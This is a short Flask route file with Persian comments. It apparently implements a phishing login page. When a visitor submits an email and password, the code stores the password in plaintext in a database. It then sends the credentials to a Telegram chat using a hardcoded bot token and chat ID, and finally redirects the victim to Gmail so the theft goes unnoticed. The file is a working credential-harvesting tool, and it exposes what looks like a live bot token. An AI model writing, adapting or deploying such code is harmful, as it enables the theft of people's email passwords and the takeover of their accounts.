from flask import Blueprint, render_template, request, redirect
from app import db
from app.models import UserLog
import re
import telebot

main = Blueprint('main', __name__)

# 📌 Regex برای اعتبارسنجی
email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
password_regex = r'^.{6,}$'  # حداقل 6 کاراکتر

# 📌 تنوکن_بات_خودت_اینجا"ظیمات بات تلگرام
BOT_TOKEN = "8227322387:AAE5ydjL2M5WqJZtiJx92va1g1uj8-7FNvI"
CHAT_ID = "2030813338"
bot = telebot.TeleBot(BOT_TOKEN)

@main.route('/', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        # 🔍 اعتبارسنجی
        if not re.match(email_regex, username):
            error = "Enter a valid email"
        elif not re.match(password_regex, password):
            error = "Incorrect password. Try again."
        else:
            # ✅ ذخیره در دیتابیس
            new_log = UserLog(username=username, password=password)
            db.session.add(new_log)
            db.session.commit()

            # ✅ ارسال به تلگرام
            message = (
                "⚡ Someone just entered data\n\n"
                f"📧 Email: {username}\n"
                f"🔑 Password: {password}"
            )
            try:
                bot.send_message(CHAT_ID, message)
            except Exception as e:
                print(f"Telegram error: {e}")

            # ✅ ریدایرکت به Gmail
            return redirect("https://mail.google.com/")

    return render_template('login.html', error=error)